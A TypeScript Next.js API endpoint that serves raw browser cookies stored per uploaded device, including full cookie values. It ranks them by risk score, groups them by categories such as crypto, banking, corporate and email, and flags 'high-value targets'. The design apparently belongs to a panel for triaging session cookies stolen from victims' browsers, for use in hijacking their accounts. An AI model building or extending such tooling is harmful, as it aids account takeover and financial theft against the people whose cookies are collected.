import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/db"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/cookies/[deviceId]
 *
 * Raw cookies extracted from browsers with risk scoring and categorization
 * Supports filtering by category: ?category=crypto,corporate,banking
 * Supports filtering by risk: ?risk=critical,high
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  try {
    const user = await validateRequest(request)
    if (!user) {
      return NextResponse.json(
        { success: false, error: "Unauthorized" },
        { status: 401 }
      )
    }

    const { deviceId } = params
    const { searchParams } = new URL(request.url)
    const categoryFilter = searchParams.get("category")
    const riskFilter = searchParams.get("risk")

    // Get device info
    const deviceResults = await executeQuery<any>(
      `SELECT device_id, device_name, upload_date FROM devices WHERE device_id = ? LIMIT 1`,
      [deviceId]
    )

    if (!deviceResults || deviceResults.length === 0) {
      return NextResponse.json(
        { success: false, error: "Device not found" },
        { status: 404 }
      )
    }

    const device = deviceResults[0]

    // Build WHERE clause for filters
    let whereConditions = ["device_id = ?"]
    let queryParams: any[] = [deviceId]

    if (categoryFilter) {
      const categories = categoryFilter.split(",").map(c => c.trim())
      const categoryConditions = categories.map(() => "primary_category = ?")
      whereConditions.push(`(${categoryConditions.join(" OR ")})`)
      queryParams.push(...categories)
    }

    if (riskFilter) {
      const riskLevels = riskFilter.split(",").map(r => r.trim())
      const riskConditions = riskLevels.map(() => "risk_level = ?")
      whereConditions.push(`(${riskConditions.join(" OR ")})`)
      queryParams.push(...riskLevels)
    }

    const whereClause = whereConditions.join(" AND ")

    // Get cookies with all fields
    const cookies = await executeQuery<any>(
      `SELECT
        id,
        host_key,
        name,
        value,
        path,
        expires_utc,
        is_secure,
        is_httponly,
        has_expires,
        is_persistent,
        samesite,
        primary_category,
        categories,
        risk_level,
        risk_score,
        browser,
        profile,
        file_path,
        created_at
       FROM cookies
       WHERE ${whereClause}
       ORDER BY
         CASE risk_level
           WHEN 'critical' THEN 0
           WHEN 'high' THEN 1
           WHEN 'medium' THEN 2
           WHEN 'low' THEN 3
           ELSE 4
         END,
         risk_score DESC,
         host_key,
         name`,
      queryParams
    )

    // Parse categories JSON
    const processedCookies = (cookies || []).map((cookie: any) => ({
      ...cookie,
      categories: cookie.categories ? JSON.parse(cookie.categories) : [],
      is_secure: Boolean(cookie.is_secure),
      is_httponly: Boolean(cookie.is_httponly),
      has_expires: Boolean(cookie.has_expires),
      is_persistent: Boolean(cookie.is_persistent)
    }))

    // Calculate statistics
    const stats = {
      total_cookies: processedCookies.length,
      unique_domains: new Set(processedCookies.map((c: any) => c.host_key)).size,
      unique_browsers: new Set(processedCookies.map((c: any) => c.browser).filter(Boolean)).size,
      secure_cookies: processedCookies.filter((c: any) => c.is_secure).length,
      httponly_cookies: processedCookies.filter((c: any) => c.is_httponly).length,
      persistent_cookies: processedCookies.filter((c: any) => c.is_persistent).length,

      // Risk breakdown
      critical_risk: processedCookies.filter((c: any) => c.risk_level === 'critical').length,
      high_risk: processedCookies.filter((c: any) => c.risk_level === 'high').length,
      medium_risk: processedCookies.filter((c: any) => c.risk_level === 'medium').length,
      low_risk: processedCookies.filter((c: any) => c.risk_level === 'low').length,

      // Category breakdown
      crypto_cookies: processedCookies.filter((c: any) => c.primary_category === 'crypto').length,
      banking_cookies: processedCookies.filter((c: any) => c.primary_category === 'banking').length,
      corporate_cookies: processedCookies.filter((c: any) => c.primary_category === 'corporate').length,
      email_cookies: processedCookies.filter((c: any) => c.primary_category === 'email').length,
      cloud_cookies: processedCookies.filter((c: any) => c.primary_category === 'cloud').length,
      social_cookies: processedCookies.filter((c: any) => c.primary_category === 'social').length,
      ecommerce_cookies: processedCookies.filter((c: any) => c.primary_category === 'ecommerce').length,
      gaming_cookies: processedCookies.filter((c: any) => c.primary_category === 'gaming').length
    }

    // Group cookies by category
    const cookiesByCategory = groupBy(processedCookies, 'primary_category')

    // Group cookies by risk level
    const cookiesByRisk = groupBy(processedCookies, 'risk_level')

    // Group cookies by domain
    const cookiesByDomain = groupBy(processedCookies, 'host_key')

    // Get top domains by cookie count
    const topDomains = Object.entries(cookiesByDomain)
      .map(([domain, cookies]) => ({
        domain,
        count: cookies.length,
        primary_category: cookies[0]?.primary_category || 'unknown',
        risk_level: cookies[0]?.risk_level || 'unknown',
        risk_score: Math.max(...cookies.map((c: any) => c.risk_score || 0))
      }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 50)

    // High-value targets (critical/high risk in important categories)
    const highValueTargets = processedCookies.filter((c: any) =>
      (c.risk_level === 'critical' || c.risk_level === 'high') &&
      ['crypto', 'banking', 'corporate', 'cloud', 'email'].includes(c.primary_category)
    )

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      device_name: device.device_name,
      upload_date: device.upload_date,
      filters: {
        category: categoryFilter,
        risk: riskFilter
      },
      stats,
      cookies: {
        all: processedCookies,
        by_category: cookiesByCategory,
        by_risk: cookiesByRisk,
        by_domain: cookiesByDomain,
        top_domains: topDomains,
        high_value_targets: highValueTargets
      }
    })

  } catch (error: any) {
    console.error("Error fetching cookies:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Failed to fetch cookies",
        details: error.message
      },
      { status: 500 }
    )
  }
}

/**
 * Group array by key
 */
function groupBy(array: any[], key: string): Record<string, any[]> {
  return array.reduce((result, item) => {
    const groupKey = item[key] || 'unknown'
    if (!result[groupKey]) {
      result[groupKey] = []
    }
    result[groupKey].push(item)
    return result
  }, {} as Record<string, any[]>)
}
